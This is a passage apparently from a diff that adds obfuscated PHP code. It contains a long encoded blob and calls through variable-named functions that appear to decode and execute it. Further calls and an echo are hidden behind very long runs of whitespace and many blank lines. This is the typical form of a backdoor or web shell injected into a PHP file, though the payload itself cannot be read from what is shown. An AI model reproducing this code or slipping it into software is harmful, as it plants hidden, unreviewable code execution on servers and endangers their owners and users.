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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
